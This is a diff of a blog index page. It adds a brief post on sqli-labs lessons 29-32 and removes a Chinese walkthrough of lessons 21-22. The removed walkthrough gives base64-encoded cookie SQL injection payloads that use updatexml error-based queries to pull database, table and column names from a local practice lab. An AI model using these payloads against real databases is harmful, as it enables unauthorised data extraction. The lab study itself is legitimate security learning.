@@ -64,6 +64,45 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql-labs-Less-29-32" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/18/sql-labs-Less-29-32/" class="article-date">
+  <time datetime="2021-02-18T08:54:44.000Z" itemprop="datePublished">2021-02-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/18/sql-labs-Less-29-32/">sql-labs-Less-29~32</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>电脑搭建了jspstudy，但是出错了，做不了。<br>这几关方法差不多。<br>教程：<br> <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1JE411b7kz">https://www.bilibili.com/video/BV1JE411b7kz</a></p>
+<h1>小结</h1>
+https://www.cnblogs.com/lcamry/p/5762961.html
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/18/sql-labs-Less-29-32/" data-id="cklan6xl20000gwuxhcpv3hsn" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql-labs-Less-28-28a" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/17/sql-labs-Less-28-28a/" class="article-date">
@@ -466,50 +505,6 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
 
 
   
-    <article id="post-sql-labs-Less-21~22" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/12/sql-labs-Less-21~22/" class="article-date">
-  <time datetime="2021-02-12T15:18:18.000Z" itemprop="datePublished">2021-02-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/12/sql-labs-Less-21~22/">sql-labs-Less-21~22</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1>Less-21</h1>
-
-<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-21%E5%92%8C%E5%89%8D%E4%B8%A4%E5%85%B3%E4%B8%80%E6%A0%B7%EF%BC%8C%E6%89%93%E5%BC%80http">http://127.0.0.1/sql/Less-21和前两关一样，打开http</a> header live再登陆：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-21~22/1.png" alt="1"><br>在http header live中看到我们的cookie变成了YWRtaW4=（图里的%3D是=的url编码，实际上还是前面那个）<br>还有YWRtaW4=其实是经过了base64编码处理的admin，所以我们注入时也要把我们的语句进行base64编码处理。<br>前面几关说到的hackbar就有base64编码的功能，我们可以用它来进行我们的注入：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-21~22/2.png" alt="2"><br>上面是对选中的字进行base64转码，下面的是逆转。<br>开始注入：<br>1)判断：uname=YWRtaW4n     (uname=admin’)</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/12/sql-labs-Less-21~22/3.png" alt="3"><br>闭合：uname=YWRtaW4nJw==   (uname=admin’’)<br>注释：uname=YWRtaW4nKSM=   (uname=admin’)#)<br>2)爆库：uname=YWRtaW4nYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMSlhbmQn<br>(uname=admin’and updatexml(1,concat(0x7e,(select database()),0x7e),1)and’)<br>爆表：uname=YWRtaW4nYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgdGFibGVfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPSdzZWN1cml0eScgbGltaXQgMCwxKSwweDdlKSwxKWFuZCc=<br>(uname=admin’and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),0x7e),1)and’)<br>爆列：uname=YWRtaW4nYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgY29sdW1uX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSd1c2VycycgbGltaXQgMCwxKSwweDdlKSwxKWFuZCc=<br>(uname=admin’and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’ limit 0,1),0x7e),1)and’)<br>注释的话是uname=<code>admin&#39;and updatexml(1,concat(0x7e,(构造的语句),0x7e),1))#</code>，把阴影部分的base64转码就行了。</p>
-<h1>Less-22</h1>
-和Less-21一样，只是把'改成"
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/12/sql-labs-Less-21~22/" data-id="ckl3c1h0e0000bkux55147sd5" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -546,6 +541,10 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
       <ul>
         
           <li>
+            <a href="/2021/02/18/sql-labs-Less-29-32/">sql-labs-Less-29~32</a>
+          </li>
+        
+          <li>
             <a href="/2021/02/17/sql-labs-Less-28-28a/">sql-labs-Less-28-28a</a>
           </li>
         
@@ -559,10 +558,6 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
         
           <li>
             <a href="/2021/02/16/sql-labs-Less-26a/">sql-labs-Less-26a</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/16/sql-labs-Less-26/">sql-labs-Less-26</a>
           </li>
         
       </ul>
